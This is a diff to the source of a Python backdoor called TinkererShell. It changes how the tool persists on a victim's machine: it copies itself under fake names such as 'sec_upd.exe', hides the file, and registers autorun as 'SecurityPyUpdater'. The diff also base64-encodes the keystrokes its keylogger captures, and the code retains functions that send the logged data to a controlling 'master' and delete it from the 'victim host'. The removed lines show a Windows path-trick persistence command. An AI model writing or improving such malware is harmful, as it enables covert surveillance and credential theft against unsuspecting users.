@@ -13,11 +13,12 @@ import sys
 import tempfile
 import threading
 import time
+import shutil
 from filecmp import cmp
 from tendo import singleton
+from pathlib import Path
 # pycrypto
 from Crypto.Cipher import AES
-
 
 # Importing module for autostart written by Jonas Wagner
 # http://29a.ch/2009/3/17/autostart-autorun-with-python
@@ -41,7 +42,6 @@ if os.name == 'nt':
 elif os.name == 'posix':
     platform = 'posix'
     import pyxhook
-    import shutil
 else:
     sys.exit('System not supported!')
 
@@ -50,41 +50,34 @@ with open(keylogfile, 'w') as f:
     f.write('')
 
 
-def generate_random_string(low: int, high: int) -> str:
-    """Generate a random string.\n"""
-    length = random.randint(low, high)
-    letters = string.ascii_letters + string.digits
-    return ''.join([random.choice(letters) for _ in range(length)])
-
-
 # =================================================================================================
 
 def persistence_install() -> bool:
     """Install persistence.\n"""
-    # TODO: Fix whole function, final_path variable unused
-    # TODO: Find a path writable to user with low privs
-    path = os.path.abspath(sys.argv[0])
-    if platform == 'windows':
-        target_to_autostart = os.getenv('WINDIR') + os.path.normcase('demo/sec_upd.exe')
-        if not os.path.isfile(target_to_autostart):
-            persist_name = generate_random_string(10, 15) + '.exe'
-            final_path = os.getenv('WINDIR') + os.path.normcase('/demo"/. /.. /"')
-            try:
-                # cd C:\Windows && mkdir \\?\C:\Windows\". \.. \" && copy file.exe \\?\C:\Windows\". \.. \"file.exe
-                # && mklink sigmund.exe \\?\C:\Windows\". \.. \"file.exe
-                proc = subprocess.Popen(('cd ' + os.getenv('WINDIR') + os.path.normcase(' && mkdir //?/') + os.getenv(
-                    'WINDIR') + os.path.normcase('/demo"/. /.. /" && copy ') + path + os.path.normcase(
-                    ' //?/C:/Windows/demo"/. /.. /"') + persist_name + os.path.normcase(
-                    ' && mklink /demo/sec_upd.exe //?/C:/Windows/demo/". /.. /"') + persist_name), shell=True,
-                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            except Exception as exception:
-                print(exception)
-    else:
-        target_to_autostart = '/.Xsec_upd'
+    # TODO: test on Linux
+    # TODO: test on Windows
+    if not autorun.exists('SecurityPyUpdater'):
+        path = os.path.abspath(sys.argv[0])
+        if platform == 'windows':
+            target_to_autostart = str(Path.home()) + os.path.normcase('/demo/sec_upd.exe')
+        else:
+            target_to_autostart = str(Path.home()) + '/.Xsec_upd'
         if not os.path.isfile(target_to_autostart):
             shutil.copyfile(path, target_to_autostart)
-
-    if not autorun.exists('SecurityPyUpdater'):
+        if platform == 'windows':
+            # Try to hide file adding hidden attribute to it
+            try:
+                subprocess.check_call(["attrib", "+H", target_to_autostart])
+            except:
+                return False
+        else:
+            # Give executable permission to file
+            try:
+                subprocess.Popen('chmod 700 ' + target_to_autostart, shell=True, stdout=subprocess.PIPE,
+                                 stderr=subprocess.PIPE,
+                                 stdin=subprocess.PIPE)
+            except:
+                return False
         autorun.add('SecurityPyUpdater', target_to_autostart)
         return True
     else:
@@ -92,7 +85,7 @@ def persistence_install() -> bool:
 
 
 def persistence_remove() -> bool:
-    """Uninstall persistence.\n"""
+    """Uninstall persistence (disable autorun but can't delete himself).\n"""
     if autorun.exists('SecurityPyUpdater'):
         autorun.remove('SecurityPyUpdater')
         return True
@@ -112,7 +105,7 @@ def persistence_status() -> bool:
 if persistenceactivation is True:
     persistence_install()
 
-# Verify only one istance of TinkererShell is running
+# Verify only one instance of TinkererShell is running
 me = singleton.SingleInstance()
 
 
@@ -244,9 +237,8 @@ def keylogs_stop():
 def keylogs_download(keylogfile: str):
     """Send keylogged data to the master and delete it from victim host.\n"""
     try:
-        f = open(keylogfile, 'r')
-        keylogged_data = f.read()
-        f.close()
+        with open(keylogfile, 'rb') as f:
+            keylogged_data = base64.b64decode(f.read()).decode('utf-8')
         sender(keylogged_data + '\n')
     except Exception as exception:
         sender('reachedexcept')
@@ -304,21 +296,31 @@ def keylogger(fd_temp: int, keylogfile: str):
         """"Define action triggered when a key is pressed.\n"""
         if not thr_block.isSet():
             if event.Ascii != 0 or 8:
-                with open(keylogfile, 'a') as f:
+                # Use base64 and not an encryption just for performance
+                with open(keylogfile, 'r+b') as f:
+                    data_decoded = base64.b64decode(f.read()).decode('utf-8')
+                    f.seek(0)
                     if event.Key == 'space':
-                        f.write(' ')
+                        data_decoded += ' '
+                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'BackSpace':
-                        f.write('[BackSpace]')
+                        data_decoded += '[BackSpace]'
+                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Return':
-                        f.write('[Enter]')
+                        data_decoded += '[Enter]'
+                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Shift_L':
-                        f.write('[Shift_L]')
+                        data_decoded += '[Shift_L]'
+                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Shift_R':
-                        f.write('[Shift_R]')
+                        data_decoded += '[Shift_R]'
+                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
                     elif event.Key == 'Tab':
-                        f.write('[Tab]')
+                        data_decoded += '[Tab]'
+                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
                     else:
-                        f.write(event.Key)
+                        data_decoded += event.Key
+                        f.write(base64.b64encode(data_decoded.encode('utf-8')))
         if thr_exit.isSet():
             os.close(fd_temp)
             sys.exit(0)
@@ -495,7 +497,7 @@ def backdoor(mailactivation: bool, keylogfile: str):
     if cmp(dnsfile, dnsbackup) is False:
         dnscleaner(dnsfile, dnsbackup)
     try:
-        os.remove("ChangedFile.csv")
+        os.remove(dnsbackup)
     except Exception as exception:
         print(exception)
     # Closing socket
@@ -518,15 +520,10 @@ thread2 = threading.Thread(name='sic2', target=backdoor, args=(mailactivation, k
 if mailactivation is True:
     thread3 = threading.Thread(name='sic3', target=mailsender, args=keylogfile).start()
 
-# TODO: Encrypt keylogged data Probably gonna create an array, flush it to file everytime len(buffer) >= 5k. Read
-#  encrypted file, decrypt, add buffer to decrypted_buffer, encrypt, write to file. Must make sure to flush buffer to
-#  file when 'SHkeylog download' is called.
-
 # TODO: Split source in modules
 
 # TODO: Configure/Enable/Disable mail activation from shell cmd
 
-# TODO: Keylogger: write data do disk encrypted
 # TODO: Keylogger add clipboard (trigger on ctrl+c and ctrl+v)
 
 # TODO: Add active window recognition
